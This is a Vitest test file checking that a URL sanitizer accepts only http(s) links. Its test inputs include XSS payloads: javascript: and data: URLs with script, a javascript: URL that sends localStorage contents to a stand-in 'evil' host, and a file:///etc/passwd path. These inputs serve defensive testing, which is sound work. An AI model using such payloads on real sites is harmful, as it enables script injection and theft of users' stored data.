import { describe, expect, it } from 'vitest';
import { safeHttpUrl } from './utils';

describe('safeHttpUrl', () => {
  it('allows http(s) URLs', () => {
    expect(safeHttpUrl('http://example.com/feed.xml')).toBe('http://example.com/feed.xml');
    expect(safeHttpUrl('https://example.com/feed.xml')).toBe('https://example.com/feed.xml');
  });

  it('blocks javascript: and data: URLs (XSS)', () => {
    expect(safeHttpUrl('javascript:alert(1)')).toBeUndefined();
    expect(safeHttpUrl("javascript:fetch('//evil/?t='+localStorage.x)")).toBeUndefined();
    expect(safeHttpUrl('data:text/html,<script>alert(1)</script>')).toBeUndefined();
  });

  it('blocks other schemes and invalid input', () => {
    expect(safeHttpUrl('ftp://example.com/x')).toBeUndefined();
    expect(safeHttpUrl('file:///etc/passwd')).toBeUndefined();
    expect(safeHttpUrl('not a url')).toBeUndefined();
    expect(safeHttpUrl('')).toBeUndefined();
    expect(safeHttpUrl(null)).toBeUndefined();
  });
});
